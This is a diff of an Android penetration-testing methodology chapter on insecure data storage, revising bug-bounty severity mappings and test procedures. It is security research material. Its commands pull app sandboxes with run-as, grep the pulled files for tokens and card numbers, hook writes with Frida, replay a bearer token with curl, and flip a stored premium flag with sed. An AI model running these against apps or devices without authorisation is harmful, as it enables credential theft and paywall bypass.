@@ -3,8 +3,9 @@
 > Everything the app writes to disk: SharedPreferences, SQLite/Room, DataStore, MMKV, Realm, Couchbase
 > Lite, files, caches, external and shared storage, the backup set, the clipboard, the keyboard cache and
 > the process heap. Stated bluntly: **storage alone is P5.** Bugcrowd prices
-> `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` at P5 with the
-> baseline vector `AV:P/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`, and Xiaomi, Grab and Spotify list app-private
+> `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` at P5 (no baseline
+> vector assigned) and `...on_external_storage` at P4 with the baseline vector
+> `AV:P/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`, and Xiaomi, Grab and Spotify list app-private
 > storage as explicitly out of scope. This chapter exists to produce the **payload** for a reach primitive
 > that lives in another domain, and to find the two storage sub-classes that escape P5 on their own:
 > shared storage (P4) and backup/device-transfer **restore** (a write primitive, not a read one).
@@ -15,7 +16,7 @@
 | **Milestones** | M4, M5 |
 | **VRT ceiling** | Inside the storage branch, **P4** — `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_external_storage` (CWE-312). The honest ceiling is reached by **leaving the branch**: a restored backup that authenticates on an attacker device files as `broken_authentication_and_session_management.authentication_bypass` (**P1**); a server-side credential recovered from a local store files as `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (**P1**) or `...for_internal_asset` (P3); a hardcoded DB passphrase files as `insecure_os_firmware.hardcoded_password.non_privileged_user` (**P2**) and, if reused across environments, `cryptographic_weakness.key_reuse.inter_environment` (**P2**). Never file a storage payload under `insecure_data_storage.*` when a reach primitive exists — file the reach. |
 | **Primary attacker model** | **AM-03** zero-permission local app (shared storage, MediaStore, world-readable legacy files). **AM-04** where a routinely granted `READ_MEDIA_*` is needed. **AM-11** physical unlocked, for the backup/device-transfer restore chain. **AM-05** another user of the same app, for shared-device and account-switch residue. **AM-12 own rooted device is not an attack** and is the single most common reason a D11 report closes as informational. |
-| **Maps to** | MASVS-STORAGE-1, MASVS-STORAGE-2, MASVS-PLATFORM-1, MASVS-PLATFORM-3, MASVS-CODE · MASTG-TEST-0009, MASTG-TEST-0200, MASTG-TEST-0201, MASTG-TEST-0202, MASTG-TEST-0203, MASTG-TEST-0207, MASTG-TEST-0216, MASTG-TEST-0231, MASTG-TEST-0258, MASTG-TEST-0262, MASTG-TEST-0287, MASTG-TEST-0304, MASTG-TEST-0305, MASTG-TEST-0306, MASTG-TEST-0316, MASTG-TEST-0011 (deprecated), MASTG-TEST-0006 (deprecated) · MASTG-TECH-0002, MASTG-TECH-0008, MASTG-TECH-0043, MASTG-TECH-0044, MASTG-TECH-0127, MASTG-TECH-0128, MASTG-TECH-0142 · MASTG-KNOW-0036, MASTG-KNOW-0037, MASTG-KNOW-0038, MASTG-KNOW-0039, MASTG-KNOW-0040, MASTG-KNOW-0041, MASTG-KNOW-0042, MASTG-KNOW-0050, MASTG-KNOW-0051, MASTG-KNOW-0055, MASTG-KNOW-0142 · MASTG-TOOL-0029, MASTG-TOOL-0106, MASTG-TOOL-0036, MASTG-TOOL-0129, MASTG-TOOL-0144 · MASTG-BEST-0004, MASTG-BEST-0019, MASTG-BEST-0050 · MASTG-DEMO-0002 · MASWE-0001, MASWE-0002, MASWE-0005, MASWE-0006, MASWE-0024, MASWE-0030, MASWE-0036, MASWE-0038, MASWE-0040, MASWE-0050, MASWE-0061 · CWE-200, CWE-256, CWE-259, CWE-276, CWE-284, CWE-312, CWE-313, CWE-321, CWE-359, CWE-459, CWE-524, CWE-532, CWE-668, CWE-729, CWE-732, CWE-919, CWE-921, CWE-922 · T1409, T1420, T1533, T1532, T1635, T1638, T1628.003, T1513, T1417.001, M1006, AN1840 |
+| **Maps to** | MASVS-STORAGE-1, MASVS-STORAGE-2, MASVS-PLATFORM-1, MASVS-PLATFORM-3, MASVS-CODE · MASTG-TEST-0009 (deprecated — superseded by MASTG-TEST-0216/0262), MASTG-TEST-0200, MASTG-TEST-0201, MASTG-TEST-0202, MASTG-TEST-0203, MASTG-TEST-0207, MASTG-TEST-0216, MASTG-TEST-0231, MASTG-TEST-0258, MASTG-TEST-0262, MASTG-TEST-0287, MASTG-TEST-0304, MASTG-TEST-0305, MASTG-TEST-0306, MASTG-TEST-0316, MASTG-TEST-0011 (deprecated), MASTG-TEST-0006 (deprecated) · MASTG-TECH-0002, MASTG-TECH-0008, MASTG-TECH-0043, MASTG-TECH-0044, MASTG-TECH-0127, MASTG-TECH-0128, MASTG-TECH-0142 · MASTG-KNOW-0036, MASTG-KNOW-0037, MASTG-KNOW-0038, MASTG-KNOW-0039, MASTG-KNOW-0040, MASTG-KNOW-0041, MASTG-KNOW-0042, MASTG-KNOW-0050, MASTG-KNOW-0051, MASTG-KNOW-0055, MASTG-KNOW-0142 · MASTG-TOOL-0029, MASTG-TOOL-0106, MASTG-TOOL-0036, MASTG-TOOL-0129, MASTG-TOOL-0144 · MASTG-BEST-0004, MASTG-BEST-0019, MASTG-BEST-0050 · MASTG-DEMO-0002 · MASWE-0001, MASWE-0002, MASWE-0005, MASWE-0006, MASWE-0024, MASWE-0030, MASWE-0036, MASWE-0038, MASWE-0040, MASWE-0050, MASWE-0061 · CWE-200, CWE-256, CWE-259, CWE-276, CWE-284, CWE-312, CWE-313, CWE-321, CWE-359, CWE-459, CWE-524, CWE-532, CWE-668, CWE-729, CWE-732, CWE-919, CWE-921, CWE-922 · T1409, T1420, T1533, T1532, T1635, T1638, T1628.003, T1513, T1417.001, M1006, AN1840 |
 
 ## Why this domain pays
 
@@ -98,7 +99,9 @@ blocked note: `blocked — D11-<nnn>: stock device + release build; local-transp
 4. **Grep the control-plane keys against the backup set** (D11-056). This is the item with the highest
    ceiling in the chapter and it takes one grep plus one `cat`.
 5. **`getWritableDatabase("` with any string argument** (D11-023). The framework overload takes no
-   argument, so an argument is SQLCipher and a literal there is the whole finding, mechanically.
+   argument, so an argument is SQLCipher and a literal there is the whole finding, mechanically — for the
+   modern package (`net.zetetic`, >= 4.5) the argument to `SupportOpenHelperFactory`/`openOrCreateDatabase`
+   is the equivalent tell.
 6. **External / shared storage diff** (D11-041). The only storage class the VRT rates above P5 on its own.
 7. **The write direction: MediaStore `RELATIVE_PATH`, symlink races, zip-slip, `Content-Disposition`**
    (D11-045 to D11-049). Slower to set up, and the only route from this chapter to Critical.
@@ -111,6 +114,8 @@ blocked note: `blocked — D11-<nnn>: stock device + release build; local-transp
 
 ## Items
 
+`$DEC` = `$E/decompiled` (START.md §6): jadx at `$DEC/jadx/sources/`, apktool at `$DEC/apktool/` (`AndroidManifest.xml`, `res/`, `assets/`, `lib/`); the DEX extracted once to `$DEC/dex/`; cross-platform dumps under `$DEC/<framework>/` (e.g. `$DEC/il2cpp/dump.cs`).
+
 ### D11-001 · The reachability rule — name the unprivileged reader before writing the word "storage"
 
 | | |
@@ -120,7 +125,7 @@ blocked note: `blocked — D11-<nnn>: stock device + release build; local-transp
 | **Attacker** | AM-03 / AM-04 / AM-11; explicitly **not** AM-12 |
 | **Applies to** | all — this is the gate for every other item in the chapter |
 | **Requires** | device |
-| **Maps to** | VRT baseline vector `AV:P/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`; CWE-312; MASWE-0001 |
+| **Maps to** | VRT baseline vector `AV:P/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` (assigned to the external-storage node; the internal node carries none); CWE-312; MASWE-0001 |
 
 - **Test:** Before writing anything, answer in one sentence: *which actor, holding what, reads this file?*
   The VRT encodes the answer in its tree — internal storage P5, external storage P4 — and neither is payable
@@ -169,11 +174,11 @@ adb logcat -s POC:E -d
 - **How:**
 ```bash
 adb shell run-as $PKG id                                     # debuggable?
-grep -n 'sharedUserId' out/AndroidManifest.xml               # sibling UID?
+grep -n 'sharedUserId' $DEC/apktool/AndroidManifest.xml               # sibling UID?
 adb shell pm list packages -U | grep " uid:$(adb shell dumpsys package $PKG | awk '/userId=/{print $1}' | head -1 | cut -d= -f2)"
-grep -nE 'allowBackup|fullBackupContent|dataExtractionRules' out/AndroidManifest.xml
+grep -nE 'allowBackup|fullBackupContent|dataExtractionRules' $DEC/apktool/AndroidManifest.xml
 adb shell dumpsys package $PKG | sed -n '/Provider Resolver Table/,/Key Set Manager/p'
-grep -rnE 'setAllowFileAccess|setAllowFileAccessFromFileURLs|setAllowUniversalAccessFromFileURLs' out/sources/
+grep -rnE 'setAllowFileAccess|setAllowFileAccessFromFileURLs|setAllowUniversalAccessFromFileURLs' $DEC/jadx/sources/
 adb shell run-as $PKG find . -type f ! -perm 600 -exec ls -l {} \;
 ```
 - **Proof:** A seven-row table with a yes/no and the evidence command for each primitive, pasted into the
@@ -194,6 +199,7 @@ adb shell run-as $PKG find . -type f ! -perm 600 -exec ls -l {} \;
 | **Applies to** | `android:debuggable="true"` builds, and all packages on `userdebug`/`eng` images |
 | **Requires** | device |
 | **Maps to** | MASTG-TECH-0008; AOSP `run-as` semantics |
+| **Record** | `logs/D11-003.txt`; the finding is D02-029 (debuggable release build); D11-003 is the technique — cite D02-029's log, do not file twice |
 
 - **Test:** One command tells you whether root is needed for the whole chapter. On a shipped debuggable
   release it is simultaneously a D02 High and the non-root retrieval path that lifts every storage payload
@@ -204,10 +210,11 @@ adb shell run-as $PKG id
 adb shell run-as $PKG ls -R /data/data/$PKG
 adb shell run-as $PKG cat /data/data/$PKG/shared_prefs/*.xml
 adb exec-out run-as $PKG cat databases/app.db > app.db          # exfil without root
-# whole-tree copy (adb pull will not traverse run-as; do it file by file)
-dir="/data/data/$PKG"; IFS=$'\n'
-for d in $(adb shell run-as $PKG find "$dir" -type d); do mkdir -p ".$d"; done
-for f in $(adb shell run-as $PKG find "$dir" -type f); do adb exec-out run-as $PKG cat "$f" > ".$f"; done
+# whole-tree copy in ONE shot, with a denominator (adb pull will not traverse run-as; a shell `for f in $(adb shell ...)` loop
+# breaks on spaces and hides a mid-loop run-as denial behind a partial pull that looks complete — D11-010)
+adb exec-out run-as "$PKG" tar -cf - . > sandbox.tar && mkdir -p pulled && tar -xf sandbox.tar -C pulled   # toybox tar, Android 10+
+echo "on device: $(adb shell run-as "$PKG" find . -type f | wc -l)  pulled: $(find pulled -type f | wc -l)"   # the two counts must match
+# older devices without toybox tar: the per-file Python loop in D11-010
 ```
 - **Proof:** Content returned where a plain `adb shell cat` on the same path returns `Permission denied`.
   Show both commands side by side — that contrast is what proves the boundary and the bypass.
@@ -276,9 +283,9 @@ strings pulled/files/*.cblite | grep -iE 'pass|token|card|cvv|secret|auth|bearer
 - **How:**
 ```bash
 M=x4hd2k9pq7                                            # never: test, marker, password, AAAA
-adb shell run-as $PKG tar -cf - . > before.tar          # or, rooted: adb pull /data/data/$PKG ./before/
+adb exec-out run-as "$PKG" tar -cf - . > before.tar      # exec-out is binary-safe (`adb shell` is not); rooted: adb pull /data/data/$PKG ./before/
 # ... log in, save a card, send a message, all using $M as the value ...
-adb shell run-as $PKG tar -cf - . > after.tar
+adb exec-out run-as "$PKG" tar -cf - . > after.tar
 mkdir b a && tar xf before.tar -C b && tar xf after.tar -C a
 grep -rl "$M" b/ && echo "BASELINE CONTAINS THE MARKER -- pick a new one, this hit is worthless"
 diff -rq b a | tee changed.txt
@@ -315,9 +322,9 @@ grep -rl "$(printf "$M" | xxd -p | tr -d '\n' | sed 's/../\\x&/g')" a/
   suspicious field find a `putString`/`toJson`/`insert`/file-write that actually carries it.
 - **How:**
 ```bash
-grep -rn 'edit()\.put\|putString(\|putBoolean(\|putInt(' out/sources/ | grep -iE 'token|auth|session|card|cvv|pin'
-grep -rn 'openFileOutput(\|FileOutputStream(\|\.writeText(\|Files\.write(' out/sources/
-grep -rn 'insert(\|Room\.databaseBuilder\|@Entity' out/sources/ | grep -iE 'card|token|user'
+grep -rn 'edit()\.put\|putString(\|putBoolean(\|putInt(' $DEC/jadx/sources/ | grep -iE 'token|auth|session|card|cvv|pin'
+grep -rn 'openFileOutput(\|FileOutputStream(\|\.writeText(\|Files\.write(' $DEC/jadx/sources/
+grep -rn 'insert(\|Room\.databaseBuilder\|@Entity' $DEC/jadx/sources/ | grep -iE 'card|token|user'
 ```
 ```javascript
 // runtime confirmation — hook the write, print a backtrace, and watch for a preceding Cipher
@@ -352,6 +359,7 @@ Java.perform(function () {
 | **VRT** | n/a (accuracy gate) |
 | **Attacker** | n/a |
 | **Applies to** | all R8-minified apps |
+| **Requires** | — |
 | **Maps to** | mechanism (observed in a real engagement; no external identifier) |
 
 - **Test:** Two grep traps that produce clean-looking false negatives and have each caused a real "clean"
@@ -367,7 +375,7 @@ Java.perform(function () {
 # 1 — match both shapes
 grep -oE '<(string|int|long|boolean|float) name="[^"]+"( value="[^"]*")?>?[^<]*' shared_prefs/*.xml
 # 2 — R8-renamed annotations
-grep -rnE '@[a-z]\("(card|token|cvv|pan|auth|session|refresh|pin)[a-z_]*"\)' out/sources/
+grep -rnE '@[a-z]\("(card|token|cvv|pan|auth|session|refresh|pin)[a-z_]*"\)' $DEC/jadx/sources/
 ```
 - **Proof:** The corrected pattern returning hits where the naive one returned zero, shown as two greps
   side by side.
@@ -384,6 +392,7 @@ grep -rnE '@[a-z]\("(card|token|cvv|pan|auth|session|refresh|pin)[a-z_]*"\)' out
 | **VRT** | n/a (accuracy gate) |
 | **Attacker** | n/a |
 | **Applies to** | all payment, wallet and identity engagements |
+| **Requires** | — |
 | **Maps to** | mechanism; feeds the D23 payment-data claim |
 
 - **Test:** Grepping app storage for a card's last four digits flipped 0 -> 1 -> 0 across three runs of the
@@ -392,7 +401,7 @@ grep -rnE '@[a-z]\("(card|token|cvv|pan|auth|session|refresh|pin)[a-z_]*"\)' out
   database `strings` output.
 - **How:**
 ```bash
-strings -a pulled/**/* | grep -oE '\b[2-6][0-9]{15}\b' | sort -u | while read -r n; do
+find pulled -type f -print0 | xargs -0 strings -a | grep -oE '\b[2-6][0-9]{15}\b' | sort -u | while read -r n; do
   python3 - "$n" <<'PY'
 import sys
 n = sys.argv[1]; d = [int(c) for c in n][::-1]
@@ -418,6 +427,7 @@ grep -rnE '"(pan|card_number|cardNumber|cvv|cvc|expiry|exp_month)"' pulled/
 | **VRT** | n/a (accuracy gate) |
 | **Attacker** | n/a |
 | **Applies to** | all; acute on React Native, Flutter and any DI-heavy app |
+| **Requires** | — |
 | **Maps to** | mechanism; the canonical retraction case in the local corpus |
 
 - **Test:** The most instructive retraction in the corpus is a finding whose every `file:line` citation was
@@ -427,10 +437,10 @@ grep -rnE '"(pan|card_number|cardNumber|cvv|cvc|expiry|exp_month)"' pulled/
   mapping.
 - **How:**
 ```bash
-grep -rn 'createNativeModules\|ReactPackage\|getPackages\|@Provides\|@Binds\|@Module' out/sources/
-grep -rniE 'keychain|securestore|EncryptedSharedPreferences|MasterKey|MMKV|AsyncStorage|preferences_pb' out/sources/
+grep -rn 'createNativeModules\|ReactPackage\|getPackages\|@Provides\|@Binds\|@Module' $DEC/jadx/sources/
+grep -rniE 'keychain|securestore|EncryptedSharedPreferences|MasterKey|MMKV|AsyncStorage|preferences_pb' $DEC/jadx/sources/
 # read the generated PackageList / DI graph END TO END, then check what the JS layer actually calls
-grep -rn 'NativeModules\.' assets/index.android.bundle | sort -u | head -40
+grep -rn 'NativeModules\.' $DEC/apktool/assets/index.android.bundle | sort -u | head -40
 ```
 - **Proof:** The worked case: a genuine stub module existed **while** `com.oblador.keychain.KeychainModule`
   (JS name `RNKeychainManager`) was also registered and was what the JS called. The JS-visible module name
@@ -486,7 +496,7 @@ print(f"scanned {len(files)} files, {hits} hits")
 | | |
 |---|---|
 | **Severity ceiling** | Low standalone; High only with a demonstrated non-root reader |
-| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5); `insecure_data_storage.server_side_credentials_storage.plaintext` (P4, CWE-256) when it is a password rather than a token |
+| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5) — a stored *password* stays on this same node (`server_side_credentials_storage` is a server-side node, PR:H, and a triager rejects it for a client store): argue up on data class, and file the replay outcome as `broken_authentication_and_session_management.authentication_bypass` (P1) when it authenticates |
 | **Attacker** | AM-03 only via a reach primitive; AM-11 with ADB; **AM-12 is not an attack** |
 | **Applies to** | all — **CURRENT** |
 | **Requires** | device |
@@ -500,8 +510,8 @@ print(f"scanned {len(files)} files, {hits} hits")
   devices)" — so name the specific retrieval path.
 - **How:**
 ```bash
-grep -rn 'getSharedPreferences(\|getDefaultSharedPreferences(' out/sources/ -A3 | grep -iE 'token|auth|session|refresh|pin'
-grep -rn 'edit()\.putString(' out/sources/ | grep -iE 'token|auth|session|refresh'
+grep -rn 'getSharedPreferences(\|getDefaultSharedPreferences(' $DEC/jadx/sources/ -A3 | grep -iE 'token|auth|session|refresh|pin'
+grep -rn 'edit()\.putString(' $DEC/jadx/sources/ | grep -iE 'token|auth|session|refresh'
 adb shell run-as $PKG sh -c 'for f in shared_prefs/*.xml; do echo "== $f"; cat "$f"; done'
 adb shell run-as $PKG cat shared_prefs/auth.xml | grep -oE 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
 # known token homes worth naming explicitly
@@ -539,9 +549,9 @@ curl -i -H "Authorization: Bearer <token>" https://api.target.tld/v1/me
   set the threat model themselves.
 - **How:**
 ```bash
-grep -rn 'EncryptedSharedPreferences\|MasterKey\|EncryptedFile' out/sources/ -A6
+grep -rn 'EncryptedSharedPreferences\|MasterKey\|EncryptedFile' $DEC/jadx/sources/ -A6
 # list every prefs file the app creates, then mark which are encrypted
-grep -rnoE 'getSharedPreferences\("([^"]+)"' out/sources/ | sort -u
+grep -rnoE 'getSharedPreferences\("([^"]+)"' $DEC/jadx/sources/ | sort -u
 adb shell run-as $PKG ls -la shared_prefs/
 # encrypted stores render as base64 blobs with obfuscated key names; plaintext ones do not
 adb shell run-as $PKG head -5 shared_prefs/*.xml
@@ -552,7 +562,7 @@ adb shell run-as $PKG head -5 shared_prefs/*.xml
 - **Escalation:** -> D12 for the master-key parameters; -> D11-056 if the cleartext store also holds a value
   the app trusts on next launch.
 - **Ruled out when:** No `androidx.security.crypto` dependency is present anywhere in the merged app
-  (`grep -rn 'androidx.security' out/` and the dependency list), so there is no inconsistency to argue —
+  (`grep -rn 'androidx.security' $DEC/jadx/sources/` and the dependency list), so there is no inconsistency to argue —
   the finding is then plain D11-011 and carries D11-011's rating.
 
 ### D11-013 · `EncryptedSharedPreferences` present but the key is not user-authentication-bound
@@ -574,10 +584,10 @@ adb shell run-as $PKG head -5 shared_prefs/*.xml
   1.1.0 and Google advises against it for new apps; a modern app still relying on it is worth a line.
 - **How:**
 ```bash
-grep -rn 'EncryptedSharedPreferences\|MasterKey\|KeyGenParameterSpec' out/sources/ -A12 | \
+grep -rn 'EncryptedSharedPreferences\|MasterKey\|KeyGenParameterSpec' $DEC/jadx/sources/ -A12 | \
   grep -nE 'setUserAuthenticationRequired|setUserAuthenticationValidityDurationSeconds|setInvalidatedByBiometricEnrollment|setUserAuthenticationParameters'
 adb shell run-as $PKG cat shared_prefs/FlutterSecureStorage.xml 2>/dev/null   # base64-wrapped blobs
-objection --gadget $PKG explore
+objection -S "$SERIAL" -g "$PKG" explore
 > android keystore list
 ```
 ```javascript
@@ -613,17 +623,17 @@ Java.perform(function () {
 | **Attacker** | AM-03 with a reach primitive |
 | **Applies to** | apps using `androidx.datastore` |
 | **Requires** | device |
-| **Maps to** | MASTG-TEST-0306 (**status: placeholder** — no published procedure), MASTG-KNOW-0142, MASWE-0001 |
+| **Maps to** | MASTG-TEST-0305 (**status: placeholder** — no published procedure), MASTG-KNOW-0142, MASWE-0001 |
 
 - **Test:** DataStore is the modern replacement for SharedPreferences and is *not* encrypted by default. Its
   files live in `files/datastore/*.preferences_pb` (Preferences DataStore) or a custom path (Proto
-  DataStore), so a `shared_prefs/`-only sweep misses them entirely. MASTG-TEST-0306 is a placeholder with no
+  DataStore), so a `shared_prefs/`-only sweep misses them entirely. MASTG-TEST-0305 is a placeholder with no
   method — the note states the intent is to confirm "absence of secure serializers", so supply the procedure
   yourself.
 - **How:**
 ```bash
-grep -rn 'PreferenceDataStoreFactory\|DataStoreFactory\|preferencesDataStore(\|dataStore(' out/sources/ -A6
-grep -rn 'Serializer<' out/sources/ | grep -iE 'crypt|cipher|aead'     # absence is the point
+grep -rn 'PreferenceDataStoreFactory\|DataStoreFactory\|preferencesDataStore(\|dataStore(' $DEC/jadx/sources/ -A6
+grep -rn 'Serializer<' $DEC/jadx/sources/ | grep -iE 'crypt|cipher|aead'     # absence is the point
 adb shell run-as $PKG find . -name '*.preferences_pb' -o -name '*.pb'
 adb exec-out run-as $PKG cat files/datastore/settings.preferences_pb | strings
 adb exec-out run-as $PKG cat files/datastore/settings.preferences_pb | protoc --decode_raw 2>/dev/null
@@ -633,7 +643,7 @@ adb exec-out run-as $PKG cat files/datastore/settings.preferences_pb | protoc --
 - **Escalation:** -> D11-056 if any key in it is a control-plane value; -> D13 for credentials.
 - **Ruled out when:** Every DataStore is built with a serializer that wraps `EncryptedFile`/Tink, or the
   store contains only UI state (theme, last tab, sort order) after a fully exercised authenticated session.
-  Cite MASTG-TEST-0306's placeholder status so the reader knows why no test id backs the procedure.
+  Cite MASTG-TEST-0305's placeholder status so the reader knows why no test id backs the procedure.
 
 ### D11-015 · MMKV stores — enumerate them, and check the version for the logged-key CVE
 
@@ -654,8 +664,8 @@ adb exec-out run-as $PKG cat files/datastore/settings.preferences_pb | protoc --
 ```bash
 adb shell run-as $PKG ls -la files/mmkv/
 adb exec-out run-as $PKG cat files/mmkv/mmkv.default > mmkv.default && strings mmkv.default | grep -iE 'token|bearer|eyJ|user|pin'
-grep -rn 'MMKV\.\|mmkvWithID\|initialize(\|cryptKey' out/sources/
-grep -rn 'react-native-mmkv' package.json assets/index.android.bundle 2>/dev/null
+grep -rn 'MMKV\.\|mmkvWithID\|initialize(\|cryptKey' $DEC/jadx/sources/
+grep -rn 'react-native-mmkv' package.json $DEC/apktool/assets/index.android.bundle 2>/dev/null
 # the CVE path
 adb logcat -d | grep -iE 'mmkv.*key|encryption key'
 ```
@@ -672,7 +682,7 @@ adb logcat -d | grep -iE 'mmkv.*key|encryption key'
 | | |
 |---|---|
 | **Severity ceiling** | Medium standalone; High with a reach primitive and PII/credentials |
-| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5); `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) for the data class |
+| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5); `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) for the data class |
 | **Attacker** | AM-03 with a reach primitive |
 | **Applies to** | apps using `io.realm` |
 | **Requires** | device |
@@ -685,11 +695,14 @@ adb logcat -d | grep -iE 'mmkv.*key|encryption key'
 ```bash
 adb shell run-as $PKG ls -la files/*.realm files/*.realm.lock files/*.realm.management 2>/dev/null
 adb exec-out run-as $PKG cat files/default.realm > default.realm
-grep -rn 'io\.realm\|RealmConfiguration\|encryptionKey(\|Realm\.getInstance' out/sources/ -A6
+grep -rnE 'io\.realm(\.kotlin)?|RealmConfiguration|encryptionKey\(|Realm\.(getInstance|open)\(' $DEC/jadx/sources/ -A6   # Java AND Kotlin SDK packages
 strings default.realm | grep -iE 'token|bearer|@|passw|card|[0-9]{10,}' | head -40
 ```
-  Open it with the Realm Browser (`github.com/realm/realm-browser-osx`) for a screenshot-quality artefact.
-- **Proof:** The Realm Browser opening the pulled file without a key and rendering user records, or the
+  Open it with Realm Studio (`github.com/realm/realm-studio`; releases still downloadable — `realm-browser-osx` was
+  archived in 2018) for a screenshot-quality artefact. The Realm/Atlas Device SDKs were deprecated by the vendor in
+  2024 (EOL 2025) but the on-disk format is unchanged and apps still ship them — say so in the report so the finding is
+  not dismissed as "unmaintained library".
+- **Proof:** Realm Studio opening the pulled file without a key and rendering user records, or the
   `strings` output with the PII visible.
 - **Escalation:** If `encryptionKey()` **is** used, do not stop — attack the key source in D12 (a constant, a
   `ANDROID_ID` derivation and a Keystore-wrapped key are three completely different findings).
@@ -716,9 +729,9 @@ strings default.realm | grep -iE 'token|bearer|@|passw|card|[0-9]{10,}' | head -
 ```bash
 adb shell run-as $PKG find . -iname '*.cblite*' -o -iname '*.cblite2' | tee cblite.txt
 adb exec-out run-as $PKG cat files/db.cblite2/db.sqlite3 > cb.db 2>/dev/null
-for f in $(cat cblite.txt); do adb exec-out run-as $PKG cat "$f" > "$(basename "$f")"; done
+while IFS= read -r f; do adb exec-out run-as "$PKG" cat "$f" > "$(basename "$f")"; done < cblite.txt   # read -r, not `for f in $(cat ...)`: paths with spaces (D11-010)
 strings *.cblite* | grep -iE 'pass|token|card|cvv|secret|auth|bearer|eyJ'
-grep -rn 'com\.couchbase\|CouchbaseLite\|DatabaseConfiguration\|setEncryptionKey' out/sources/
+grep -rn 'com\.couchbase\|CouchbaseLite\|DatabaseConfiguration\|setEncryptionKey' $DEC/jadx/sources/
 ```
 - **Proof:** A JSON document body containing a credential or PII recovered from the `.cblite` with `strings`
   alone, with the file path. The `-wal` sibling frequently holds documents the app believes it deleted.
@@ -751,12 +764,14 @@ adb shell run-as $PKG ls -la files/mmkv/
 adb shell run-as $PKG cat shared_prefs/CapacitorStorage.xml
 # Cordova / Capacitor WebView stores
 adb shell run-as $PKG ls -laR 'app_webview/Default/Local Storage' app_webview/Default/IndexedDB
-# Flutter
+# Flutter — shared_preferences >= 2.3 (SharedPreferencesAsync / WithCache) writes Jetpack DataStore, the legacy API writes XML; check both
 adb shell run-as $PKG cat shared_prefs/FlutterSharedPreferences.xml
+adb exec-out run-as "$PKG" cat files/datastore/FlutterSharedPreferences.preferences_pb | strings      # -> D11-014 for protoc --decode_raw
 adb shell run-as $PKG cat shared_prefs/FlutterSecureStorage.xml
 # Unity
 adb shell run-as $PKG cat "shared_prefs/${PKG}.v2.playerprefs.xml"
-# Xamarin / MAUI
+# Xamarin.Essentials / .NET MAUI Essentials Preferences
+adb shell run-as "$PKG" sh -c 'cat shared_prefs/*essentials*.xml'
 adb shell run-as $PKG ls -la shared_prefs/
 # cross-reference the key names you already mined from the bundle/snapshot
 grep -aiE 'token|jwt|refresh|session|pin|password|card|otp' bundle.strings | sort -u
@@ -787,9 +802,9 @@ grep -aiE 'token|jwt|refresh|session|pin|password|card|otp' bundle.strings | sor
   directory outright "even if the target app has made files world-readable (API 27 or lower)".
 - **How:**
 ```bash
-grep -rnE 'MODE_WORLD_READABLE|MODE_WORLD_WRITEABLE|Context\.MODE_WORLD' out/sources/
-grep -rnE 'getSharedPreferences\([^,]+, *[123]\)|openFileOutput\([^,]+, *[123]\)' out/sources/
-grep -rnE 'setReadable\(true, *false\)|setWritable\(true, *false\)|chmod\s+7|0777|0666' out/sources/
+grep -rnE 'MODE_WORLD_READABLE|MODE_WORLD_WRITEABLE|Context\.MODE_WORLD' $DEC/jadx/sources/
+grep -rnE 'getSharedPreferences\([^,]+, *[123]\)|openFileOutput\([^,]+, *[123]\)' $DEC/jadx/sources/
+grep -rnE 'setReadable\(true, *false\)|setWritable\(true, *false\)|chmod\s+7|0777|0666' $DEC/jadx/sources/
 adb shell run-as $PKG find . -type f -exec stat -c '%A %U %n' {} \; | grep -vE '^-rw-------|^-rw-rw----'
 adb shell run-as $PKG find . -perm -o+r -o -perm -o+w
 adb shell ls -l /data/data/$PKG 2>&1        # from an unprivileged shell — expect Permission denied on modern builds
@@ -858,7 +873,7 @@ adb shell run-as $PKG cat shared_prefs/Prefs.xml
   server round-trip that re-validates the entitlement.
 - **How:**
 ```bash
-grep -rnE 'is_premium|premium|subscription|lifetime|entitle|pro_|hasPurchased|unlocked' out/sources/ | grep -iE 'getBoolean|putBoolean|getString'
+grep -rnE 'is_premium|premium|subscription|lifetime|entitle|pro_|hasPurchased|unlocked' $DEC/jadx/sources/ | grep -iE 'getBoolean|putBoolean|getString'
 adb shell run-as $PKG cat shared_prefs/*.xml | grep -iE 'premium|subscription|lifetime|entitle|pro_'
 adb shell run-as $PKG sh -c "sed -i 's/\"premium_status\" value=\"false\"/\"premium_status\" value=\"true\"/' shared_prefs/app_prefs.xml"
 adb shell am force-stop $PKG && adb shell monkey -p $PKG 1
@@ -878,11 +893,11 @@ adb shell am force-stop $PKG && adb shell monkey -p $PKG 1
 | | |
 |---|---|
 | **Severity ceiling** | High; Critical for multi-user PII reachable without privilege |
-| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5); `insecure_os_firmware.failure_to_remove_sensitive_artifacts_from_disk` (VARIES, CWE-459) for the residue; `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) |
+| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5); `insecure_os_firmware.failure_to_remove_sensitive_artifacts_from_disk` (VARIES, CWE-459) for the residue; `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) |
 | **Attacker** | AM-03 with a reach primitive; AM-05 for the post-delete residue |
-| **Applies to** | all; MASTG-TEST-0304/0305 are placeholders — the commands below are the working equivalent |
+| **Applies to** | all; MASTG-TEST-0304/0306 are placeholders — the commands below are the working equivalent |
 | **Requires** | device |
-| **Maps to** | MASTG-TEST-0304, MASTG-TEST-0305 (both **status: placeholder**), MASTG-KNOW-0037 (SQLite), MASWE-0001; CVE-2018-11242 (MakeMyTrip 7.2.4, EDB 44690) |
